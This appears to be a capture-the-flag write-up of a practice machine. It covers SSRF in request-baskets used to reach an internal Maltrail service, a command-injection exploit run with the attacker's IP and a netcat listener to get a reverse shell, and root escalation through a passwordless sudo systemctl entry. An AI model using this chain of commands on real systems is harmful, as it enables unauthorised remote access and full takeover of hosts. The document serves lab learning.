Upon scanning, the following ports are identified:

- 22: SSH
- 80: Filtered
- 8338: Filtered
- 55555: Open TCP

A web page is detected on port 55555.

The webpage is powered by "request-baskets v1.2.1."

A Google search reveals potential vulnerabilities for this version.

[request-baskets SSRF](https://notes.sjtu.edu.cn/s/MUUhEymt7#)

The system indicates that an SSRF (Server Side Request Forgery) vulnerability is present in this version. We can verify this by first creating a basket and then accessing its settings, which allow us to redirect any request made to the webpage.

Let's attempt to redirect our requests to port 80 on the IP, a port that appears to be accessible only internally.

After conducting a quick Google search, we discovered that the "Mailtrail" version in use is vulnerable to "Unauthenticated OS Command Injection (RCE)." Moreover, an exploit for this vulnerability was found.

## Exlpoitation

First, let's modify the redirection:

Next, execute the exploit with a netcat listener running in the background.

```
python3 eploit.py 10.10.14.189 1234 http://10.10.11.224:55555/vh3itq8
```
This grants us a system shell under the username "puma."

## Privilege Escalation

Executing the `sudo -l` command shows that the user 'puma' can run `/usr/bin/systemctl status trail.service` as root without requiring a password.

First, let's elevate our shell using the following command:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Next, run the command (which can be executed as root without a password). 

We found the following link for our reference.

[systemctl](https://gtfobins.github.io/gtfobins/systemctl/)

Using the subsequent method, we gain access to a root terminal.

This provides us with the root flag.
